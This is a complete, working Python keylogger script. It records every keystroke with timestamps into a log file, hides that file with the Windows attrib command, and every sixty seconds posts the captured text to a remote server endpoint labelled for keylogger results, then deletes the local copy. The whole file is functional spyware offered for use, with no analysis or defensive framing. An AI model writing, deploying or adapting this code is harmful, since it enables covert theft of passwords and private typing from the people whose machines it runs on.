from pynput import keyboard
from datetime import datetime
import requests
import threading
import time
import os
import ctypes

import sys
import subprocess

# Get the directory where the executable or script is running
if getattr(sys, 'frozen', False):
    # Running as compiled executable
    BASE_DIR = os.path.dirname(sys.executable)
else:
    # Running as script
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

LOG_FILE = os.path.join(BASE_DIR, "log.txt")
SERVER_URL = "http://your-server-url.com/api/commands.php"
PASSWORD = "your-password"
SEND_INTERVAL = 60  # Seconds

# Buffer to store characters before writing
log_buffer = ""

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def hide_file(filepath):
    """Hide the log file on Windows using attrib command"""
    try:
        # Only hide if it exists
        if os.path.exists(filepath):
            subprocess.run(['attrib', '+h', filepath], check=False, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass

def write_to_log(text):
    # Check if file exists before writing to know if we need to hide it
    is_new_file = not os.path.exists(LOG_FILE)
    
    with open(LOG_FILE, "a") as f:
        f.write(text)
    
    # Only hide if we just created it
    if is_new_file:
        hide_file(LOG_FILE)

def send_logs():
    global log_buffer
    # Flush any remaining buffer before sending
    if log_buffer:
        write_to_log(log_buffer + "\n")
        log_buffer = ""

    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = f.read()
            
            if logs.strip():  # Only send if there's content
                data = {
                    "action": "add_result",
                    "password": PASSWORD,
                    "command": "keylogger_logs",
                    "result": logs
                }
                try:
                    response = requests.post(SERVER_URL, data=data)
                    if response.status_code == 200:
                        print(f"\n[*] Logs sent successfully at {get_timestamp()}")
                        # Remove the file after successful send
                        try:
                            os.remove(LOG_FILE)
                        except Exception:
                            # If remove fails, try to truncate
                            with open(LOG_FILE, "w") as f:
                                f.write("")
                    else:
                        print(f"\n[!] Failed to send logs. Status code: {response.status_code}")
                except requests.exceptions.RequestException:
                    print("\n[!] Network error, will retry later.")
    except Exception as e:
        print(f"\n[!] Error sending logs: {e}")

    # Schedule next send
    timer = threading.Timer(SEND_INTERVAL, send_logs)
    timer.daemon = True
    timer.start()

def on_press(key):
    global log_buffer
    try:
        # Handle regular characters
        if hasattr(key, 'char') and key.char is not None:
            log_buffer += key.char
        else:
            # Handle special keys
            if key == keyboard.Key.space:
                log_buffer += " "
            elif key == keyboard.Key.enter:
                # Write buffer + Enter to file with timestamp
                timestamp = get_timestamp()
                write_to_log(f"[{timestamp}] {log_buffer}\n")
                log_buffer = ""  # Reset buffer
            elif key == keyboard.Key.backspace:
                log_buffer = log_buffer[:-1]  # Remove last char
            else:
                # For other special keys, write current buffer then the key
                if log_buffer:
                    write_to_log(f"[{get_timestamp()}] {log_buffer}")
                    log_buffer = ""
                
                # Format special key
                key_name = str(key).replace("Key.", "").upper()
                
                # Ignore specific keys
                if key_name not in ["SHIFT_R", "CTRL_L"]:
                    write_to_log(f" [{key_name}]\n")

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    global log_buffer
    if key == keyboard.Key.esc:
        print("\n[!] Escape pressed. Sending final logs and exiting...")
        # Flush buffer before exit
        if log_buffer:
            write_to_log(f"[{get_timestamp()}] {log_buffer}\n")
        send_logs()  # Send one last time before exit
        return False

# Start the listener
print(f"[*] Keylogger started. Saving to {LOG_FILE}")
print(f"[*] Sending logs to {SERVER_URL} every {SEND_INTERVAL} seconds.")
print("[*] Press ESC to stop.")

# Start initial timer
send_logs()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
